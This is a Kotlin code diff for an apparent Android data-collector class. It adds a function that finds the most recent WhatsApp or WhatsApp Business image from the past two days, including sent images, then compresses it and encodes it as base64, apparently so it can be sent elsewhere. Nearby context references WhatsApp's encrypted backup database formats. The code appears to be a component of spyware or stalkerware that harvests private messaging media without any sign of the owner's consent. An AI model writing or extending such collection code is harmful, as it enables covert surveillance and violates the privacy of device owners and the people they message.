@@ -200,4 +200,35 @@ class FileManagerCollector(private val context: Context) {
         "crypt14", "crypt15", "crypt12", "db" -> "application/octet-stream"
         else -> null
     }
+
+    fun getLatestWhatsAppImageBase64(maxAgeMs: Long = 2 * 24 * 60 * 60 * 1000L): String? = try {
+        val root = root().canonicalFile
+        val candidateDirs = listOf(
+            File(root, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images"),
+            File(root, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Sent"),
+            File(root, "WhatsApp/Media/WhatsApp Images"),
+            File(root, "WhatsApp/Media/WhatsApp Images/Sent"),
+            File(root, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Images"),
+            File(root, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Images/Sent")
+        )
+        val validDirs = candidateDirs.filter { it.exists() && it.isDirectory }
+        val allImages = validDirs.flatMap { dir ->
+            dir.listFiles { f -> f.isFile && (f.name.endsWith(".jpg", true) || f.name.endsWith(".jpeg", true) || f.name.endsWith(".png", true)) }?.toList() ?: emptyList()
+        }
+        val latest = allImages.maxByOrNull { it.lastModified() }
+        if (latest != null && (System.currentTimeMillis() - latest.lastModified()) <= maxAgeMs) {
+            val bm = android.graphics.BitmapFactory.decodeFile(latest.absolutePath)
+            if (bm != null) {
+                val scaled = if (bm.width > 600 || bm.height > 600) {
+                    val scale = 600f / maxOf(bm.width, bm.height)
+                    android.graphics.Bitmap.createScaledBitmap(bm, (bm.width * scale).toInt(), (bm.height * scale).toInt(), true)
+                } else bm
+                val stream = java.io.ByteArrayOutputStream()
+                scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 75, stream)
+                "data:image/jpeg;base64," + android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
+            } else null
+        } else null
+    } catch (_: Exception) {
+        null
+    }
 }
